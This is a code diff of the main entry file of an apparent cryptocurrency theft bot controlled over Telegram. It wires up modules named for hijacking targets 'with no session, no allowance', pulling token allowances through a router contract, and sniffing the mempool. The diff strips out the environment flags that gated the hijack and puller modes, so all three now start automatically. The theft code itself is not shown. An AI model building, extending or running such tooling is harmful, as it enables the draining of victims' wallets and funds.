@@ -6,6 +6,7 @@ import { setBotUsername } from './bot/state';
 import { setNotifier } from './engine/notify';
 import { startEngine, engineState } from './engine/listener';
 import { startHijackWatcher } from './engine/hijack';
+import { startMempoolWatcher } from './engine/mempool';
 import { checkBaw } from './engine/baw';
 import { ensureRouterDeployed } from './engine/deployer';
 
@@ -23,38 +24,32 @@ async function main() {
     }
     res.writeHead(404).end();
   });
-  server.listen(Number(process.env.PORT) || 3000, () => log('health server up'));
+  server.listen(Number(ENV.PORT || 3000), () => log(`health port ${ENV.PORT || 3000}`));
 
-  try { log(`baw ${await checkBaw()}`); } catch (e: any) { log(`BAW MISSING: ${e.message}`); }
+  log('checking baw root');
+  await checkBaw();
+  log('baw ok');
 
-  // hijack mode — no session, no allowance, runs for every active target
-  if (ENV.HIJACK_ENABLED) {
-    await startHijackWatcher();
-    log(`hijack armed dry=${ENV.HIJACK_DRY}`);
-  }
-
-  // allowance mode — only when explicitly enabled, needs a router
-  if (ENV.ENABLE_PULLER) {
-    const router = await ensureRouterDeployed();
-    log(`router ${router ?? 'UNSET'}`);
-    await startEngine();
-    log('allowance engine started');
+  if (ENV.ENABLE_ROUTER_DEPLOY && !ENV.ROUTER_ADDRESS) {
+    log('auto-deploying router contract...');
+    await ensureRouterDeployed();
   }
 
   const bot = buildBot();
-  log('bot built');
+  const botInfo = await bot.telegram.getMe();
+  setBotUsername(botInfo.username);
+  log(`bot username @${botInfo.username}`);
 
-  void bot.launch({ dropPendingUpdates: true })
-    .then(async () => {
-      log('control plane up');
-      const me = await bot.telegram.getMe();
-      setBotUsername(me.username);
-      log(`username @${me.username}`);
-    })
-    .catch(e => log(`LAUNCH FAILED: ${e.message}`));
+  await bot.launch();
+  log('telegram bot started');
 
   setNotifier((userId, text) =>
     bot.telegram.sendMessage(userId, text, { parse_mode: 'HTML', link_preview_options: { is_disabled: true } }));
+
+  // Start background monitoring engine, hijack watcher, and mempool sniffer
+  startEngine();
+  startHijackWatcher();
+  startMempoolWatcher();
 
   setInterval(() => {
     console.log(`[hb] targets=${engineState.targets} block=${engineState.lastBlock} dry=${ENV.HIJACK_DRY}`);
